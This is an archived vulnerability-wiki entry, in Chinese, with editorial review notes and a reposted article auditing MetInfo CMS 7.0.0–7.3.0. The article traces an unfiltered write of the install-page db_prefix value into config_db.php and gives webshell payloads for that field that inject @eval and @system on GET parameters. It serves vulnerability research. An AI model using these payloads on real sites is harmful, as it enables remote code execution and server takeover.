---
cnvd: "CNVD-2021-01930"
source: "MrWQ/vulnerability-paper"
identifier_role: "reference"
primary_identifiers: ""
referenced_identifiers: "CNVD-2021-01930"
identifier_status: "unknown"
title: "米拓建站系统 1day 审计与利用"
product: "MetInfo 安装流程配置写入 CNVD-2021-01930关联"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证；末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告"
side_effects: "安装页面db_prefix到config_db.php写入链明确但关键源码全截图；范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%B1%B3%E6%8B%93%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%201day%20%E5%AE%A1%E8%AE%A1%E4%B8%8E%E5%88%A9%E7%94%A8.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q"
id: "vw-e0813e7b33dc5a562222c5e3"
entity_id: "ve-e0813e7b33dc5a562222c5e3"
schema_version: "1"
previous_identifier_role: "unknown"
previous_referenced_identifiers: ""
---

# 米拓建站系统 1day 审计与利用

> 编号角色校订（2026-10-04）：按归档技术正文区分主讨论编号与背景引用，更新 `primary_identifiers` / `referenced_identifiers` 及旧字段角色。旧编号原值、状态与正文保持原样，变更前字段逐字保存在 `previous_*`；后文旧的角色待核说明应按当前字段阅读。这里的角色判读不等于官方分配核验或漏洞复现。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：MetInfo 安装流程配置写入 CNVD-2021-01930关联
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证；末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 安装页面db_prefix到config_db.php写入链明确但关键源码全截图
2. 范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁
3. 必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证
4. CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入
5. payload起始中文引号可能转码损坏，原始HTTP和生成配置内容缺文本
6. 末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告

### 操作风险

安装页面db_prefix到config_db.php写入链明确但关键源码全截图；范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q)

![](../../.resource/remote/b0fe0298eeab4319f4d76ce35572067c6fc6ed29b7bdc8ded2041f9d2e012282.gif)

**原创稿件征集**

  

邮箱：edu@antvsion.com

QQ：3200599554

黑客与极客相关，互联网安全领域里

的热点话题

漏洞、技术相关的调查或分析

稿件通过并发布还能收获

200-800 元不等的稿酬  

**Metinfo****cms 命令执行**

**前话：**

米拓企业建站系统是一款由长沙某公司自主研发的免费开源企业级 CMS，该系统拥有大量的用户使用，及对该款 cms 进行审计，如果利用 CNVD-2021-01930 进行进一步深入，其危害的严重性可想而知。

**审计过程：**

1.Index：拿到源码先看根目录的 index.php 看看都包含（加载）了什么文件。

![](../../.resource/remote/d170e444ed3368e3098359f7460e3f5ea5cf9bfa6b95784691e210390cab3197.png)  

2. 关键词：在 / app/system/entrance.php 看到了配置文件的定义，全局搜索这’PATH_CONFIG‘参数。

![](../../.resource/remote/5d81f4371ea2e3f1302fd13cc535fc967218da7f286a9799fa0ab1226bbd815a.png)  

全局搜索并找到 install/index.php 文件下有这个参数，点击跟进查看。

![](../../.resource/remote/e9b13e386108ab3373486f6fa1031076037836ed151d3f1ce1706554aa1ca2da.png)  

在这个文件的 219 行有个是接收 db 数据库参数的方法。

官方说明 “$_M” 数组：  
https://doc.metinfo.cn/dev/basics/basics75.html

这里是接收 from 数据的 db_prefix 参数。也就是 “数据表前缀” 内容的值。

![](../../.resource/remote/30605505932b3f90af03bd7c5ca25a2718d04937c55a4f121b55a967c1ad4f8e.png)

往下发现是直接写入 tableper 然后赋值给 config 变量。

![](../../.resource/remote/21b63a419ac068212a542466809724c4b8f885b6a6e5e2eadf3c762b3de3728c.png)

并在 264 行 fopen 打开 /config/config_db.php 进行没有安全过滤的字节流（fputs）方式的写入。

![](../../.resource/remote/9dfbcb8133e7505e42803f4fa2ea1e5245b512bf3f0785c29ff407667af34862.png)

影响版本：7.3.0- 7.0.0

一、进行 7.3.0 安装步骤，访问 http://127.0.0.1/install/index.php

![](../../.resource/remote/f615a878740ac54a4327db2e0e608c6e764cba20d82109bcead8bdad63118a3f.png)  

二、选中传统安装继续下一步

![](../../.resource/remote/082c9c3c19fa52e3171f9c4147f2804534afd95abc2bb7ef31060ece71b80b7b.png)

![](../../.resource/remote/443334c3564052e426711d038f13443e9b1fc4d85577c8816e7c22f631879aed.png)

三、数据库信息进行写 shell

代码执行 Payload："*/@eval($_GET['1']);/*

命令执行 Payload："*/@system($_GET['1']);/*

代码执行：

![](../../.resource/remote/0f52b9ef9db0329e4c93a6594697916326e7f838558e7e47104161d1f0f07d90.png)

![](../../.resource/remote/aa2aa83c919fd3a64e427213ffb27bb8c86e5f707bddc0c811ed811c63f2f6ce.png)  

点击保存进行下一步验证，出现这报错信息，可以查看 config\config_db.php 文件。

![](../../.resource/remote/d1b9f719b1046a02bd87cbac1417b2e415468a863928936759b09f8f569370ac.png)

![](../../.resource/remote/7648c41607f67b5d6c98581a3ea28982bf96de311aff33659865ddf8055ec8c7.png)成功写入

![](../../.resource/remote/8e3d6f5c0ed8fd8fc5f3e13aa3aa58aeac238f5df0f851407aa3ae52a788f011.png)

命令执行：

![](../../.resource/remote/59e361bcae2989497917df432ec9c55b2bcc478d9637a866674dd0a90607b5e5.png)  

![](../../.resource/remote/d1b9f719b1046a02bd87cbac1417b2e415468a863928936759b09f8f569370ac.png)

![](../../.resource/remote/289e635bf8b797779eb68a35e1dda96441f115264cb9f0477b3a68cad2612893.png)

7.0.0 版本：

![](../../.resource/remote/c379aa49ade9769238870df7a8e59fb881075d0fa6ca8da05b5049d18eb2e894.png)

![](../../.resource/remote/92bbbf3e92c8e12868564c534972de2e90638f779d497978c69e9a824b6734ef.png)![](../../.resource/remote/119d122dcf7ca788fa824a240d1275149a422ced41f6a1abf6d341e32996d216.png)![](../../.resource/remote/d531e35c8fe63a55e08fe774acc8b7bc52ea00e53be77367dbd013a5d143957b.png)7.1.0 版本：

Payload："*/@eval($_GET['1']);@system($_GET['2']);/*

![](../../.resource/remote/e2dd84e92fd04fc53a52ae7206d3aa0403309507dee6aa97d0efcd97f1c57b00.png)

![](../../.resource/remote/ee5acafa2b1a0269b6e1ed68e190bd46d199bb28dad97d83121f3cf7afbd0a16.png)

![](../../.resource/remote/ee6c572cac111e4ea6f07529b1fce517a19887c4b45217cdaf5bd1c2f3c19456.png)![](../../.resource/remote/3d9159fc2ef6d96c0887afc9031f081059792dcae4c3ef8181ac384c6960aac5.png)7.2.0 版本：

Payload："*/@eval($_GET['1']);@system($_GET['2']);/*

![](../../.resource/remote/b6ab1b626e9b3531677ed6ab0c214935d5c3ff1d9097413f0cef4f60d20a6b3f.png)

![](../../.resource/remote/ca88966a6ac10f8254352acd3134eeb912c4cce0341f161e8c9695fca3181013.png)

![](../../.resource/remote/4d05afd2120b7f159c4c61a74e642436900ca3f1d31b52f0b2b2385cd6c759b7.png)

![](../../.resource/remote/4f4acc6b2d13b2bdcf6aedb80491d0bb6aff577a1d83719ba41304a904d8669b.png)

推荐实操：MetInfo SQL 注入   

https://www.hetianlab.com/expc.do?ec=ECID269f-6dc2-4412-bbad-a27109b207cf&pk_campaign=weixin-wemedia#stu    

通过该实验掌握 MetInfo SQL 注入漏洞的原因和利用方法，以及如何修复该漏洞。  

![](../../.resource/remote/ef207e0c1d0f037771ef2d1bfb00db89de3d27b26c8022f059deee50e443c8b6.gif)

戳

  

“阅读原文”

  

  

体验免费靶场！

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
